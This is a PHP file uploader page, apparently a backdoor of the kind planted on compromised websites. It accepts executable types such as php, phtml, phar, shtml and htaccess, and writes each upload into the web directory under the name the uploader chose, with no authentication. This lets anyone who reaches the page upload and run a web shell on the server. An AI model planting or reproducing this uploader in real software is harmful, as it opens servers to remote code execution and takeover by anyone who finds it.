<?php
   if(isset($_FILES['image'])){
      $errors= array();
      $file_name = $_FILES['image']['name'];
      $file_size =$_FILES['image']['size'];
      $file_tmp =$_FILES['image']['tmp_name'];
      $file_type=$_FILES['image']['type'];
      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
      
      $expensions= array("json","jpg","php","txt","phtml","html","htaccess","shtml","phar");
      
      if(in_array($file_ext,$expensions)=== false){
         $errors[]="extension not allowed, please choose a php or json file.";
      }
      
      if($file_size > 2097152){
         $errors[]='File size must be excately 2 MB';
      }
      
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,$file_name);
         echo "<span style=\"font-size: medium;color: lime;\">YOUR FILE UPLOAD SUCCESFULLY !!</span>";
      }else{
         print_r($errors);
      }
   }
?>

<html>
   <body style="text-align: center;background-color: black;font-size: 0px;">
      <br \><br \>
        <form action="" method="POST" enctype="multipart/form-data" style="font-size: medium;color: white;margin-top: 10px;">
            <b>For Public Folder Only</b><br><br>
         <input type="file" name="image" style="border: 1.5px solid lime;border-radius: 5px;" />
         <input type="submit" style="border: 1.5px solid lime;color: white;border-radius: 5px;background: transparent;padding: 3px;cursor: pointer;" />
      </form>
      
   </body>
   
   
</html>